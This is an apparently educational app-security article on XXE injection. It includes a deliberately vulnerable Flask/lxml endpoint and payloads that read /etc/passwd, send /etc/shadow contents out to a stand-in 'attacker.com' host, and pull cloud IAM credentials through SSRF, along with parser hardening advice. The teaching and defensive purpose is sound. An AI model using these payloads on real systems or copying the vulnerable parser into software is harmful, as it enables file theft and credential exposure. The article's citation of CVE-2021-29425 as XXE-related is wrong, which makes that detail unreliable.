# XML External Entities (XXE)
**Category:** App Security
**Date:** 2026-07-21
**Difficulty:** Intermediate

---

## What It Is
XXE (XML External Entity) injection exploits XML parsers that resolve references to external resources defined within a DOCTYPE declaration. When an application parses attacker-controlled XML, a malicious entity definition like `<!ENTITY xxe SYSTEM "file:///etc/passwd">` instructs the parser to fetch that resource and substitute its contents wherever `&xxe;` appears. Many XML parsers enable this behavior by default, making it a silent footgun in any codebase that accepts XML input.

## Why It Matters
XXE can expose server-side files (credentials, private keys, `/etc/shadow`), trigger internal SSRF to reach cloud metadata endpoints like `http://169.254.169.254/`, and in some parsers cause denial of service via "billion laughs" entity expansion. It was prominent enough to earn its own slot in the OWASP Top 10 for years; notable exploits include the 2014 Facebook XXE that allowed reading internal files, and CVE-2021-29425 (Apache Commons IO) which widened its attack surface.

## Practical Example

### Vulnerable scenario — a Python Flask endpoint parsing user-supplied XML:

```python
from lxml import etree
from flask import Flask, request

app = Flask(__name__)

@app.route("/parse", methods=["POST"])
def parse():
    tree = etree.fromstring(request.data)   # ❌ external entities enabled by default
    name = tree.findtext("name")
    return f"Hello, {name}!"
```

### Attacker payload (reads `/etc/passwd`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  <name>&xxe;</name>
</foo>
```

The server responds: `Hello, root:x:0:0:root:/root:/bin/bash\n...`

### Blind XXE via out-of-band exfiltration (when output isn't reflected):

```xml
<!DOCTYPE foo [
  <!ENTITY % payload SYSTEM "file:///etc/shadow">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?d=%payload;'>">
  %wrapper;
]>
<foo>&send;</foo>
```

The attacker's server logs receive the file content in the query string.

### SSRF to cloud metadata:

```xml
<!DOCTYPE foo [
  <!ENTITY cloud SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&cloud;</foo>
```

This retrieves AWS IAM role credentials from the instance metadata service.

## How to Defend

- **Disable external entity processing** in your XML parser explicitly — never rely on "secure defaults":
  - **Python (lxml):** `etree.XMLParser(resolve_entities=False, no_network=True)`
  - **Java (DocumentBuilderFactory):** set `FEATURE_SECURE_PROCESSING` to `true` and disable `http://xml.org/sax/features/external-general-entities`
  - **PHP:** `libxml_disable_entity_loader(true)` (PHP < 8.0); in PHP 8+ it's disabled by default
- **Prefer JSON or simpler formats** over XML wherever possible — eliminate the attack surface entirely.
- **Validate and allowlist** the XML schema (XSD) before parsing; reject unexpected DOCTYPE declarations at the application layer.
- **Run your XML parser with least privilege** so that even if XXE fires, it can't read sensitive files outside the app's working directory.
- **Use a Web Application Firewall (WAF) rule** to block requests containing `DOCTYPE` or `ENTITY` keywords as an additional defense-in-depth layer.

## Today's Challenge

Pick an XML-parsing endpoint in a project you work on (or spin up the vulnerable Flask snippet above).

1. Send the `/etc/passwd` payload and observe whether the server reflects file contents.
2. Then fix the parser configuration to disable external entities.
3. Replay the payload and confirm it is now rejected or returns empty.

Bonus: run `grep -r "parseXML\|etree\|DocumentBuilder\|SAXParser\|libxml" .` against a real codebase and audit each call site for the secure configuration flag.

## Key Takeaway
XML parsers trust external entity definitions by default — always explicitly disable that trust before processing any user-supplied XML.
